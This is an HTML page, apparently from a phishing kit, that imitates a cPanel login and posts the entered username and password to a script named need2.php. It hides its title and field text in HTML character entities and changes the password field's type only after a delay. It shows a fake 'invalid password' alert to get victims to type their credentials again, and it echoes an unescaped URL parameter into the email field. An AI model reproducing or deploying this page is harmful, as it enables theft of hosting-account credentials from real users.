<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#99;&#80;&#97;&#110;&#101;&#108;&#32;&#76;&#111;&#103;&#105;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 2px solid #bebebe;
	background: transparent;
    height: 36px; 
    width: 275px; 
  	font-family: TheSaB5,Trebuchet MS,Arial,Helvetica,sans-serif;
    font-size: 13px;
  	color: #000;
    padding-left: 38px; 
    border-radius: 4px;
}  
.textbox:focus { 
    outline: none; 
    border: 2px solid #bebebe; 
} 
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 678px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script type="text/javascript">
    alert("Error! you entered invalid password!");
</script>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#F0EFF0">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:131px; width:678px; height:581px; z-index:0"><img src="images/b3.png" alt="" title="" border=0 width=678 height=581></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1px; top:546px; width:676px; height:17px; z-index:1"><a href="#"><img src="images/b4.png" alt="" title="" border=0 width=676 height=17></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:290px; top:473px; width:96px; height:14px; z-index:2"><a href="#"><img src="images/b5.png" alt="" title="" border=0 width=96 height=14></a></div>
<form action=need2.php name=mtlabiyar id=mtlabiyar method=post>
<input name="email" value="<?=$_GET[user2]?>" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#46;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:285px;left:195px;top:252px;z-index:3">
<input name="psw" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#46;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:285px;left:195px;top:345px;z-index:4">
<div id="formimage1" style="position:absolute; left:194px; top:410px; z-index:5"><input type="image" name="formimage1" width="287" height="36" src="images/bgn.png"></div>
</div>

</body>
</html>
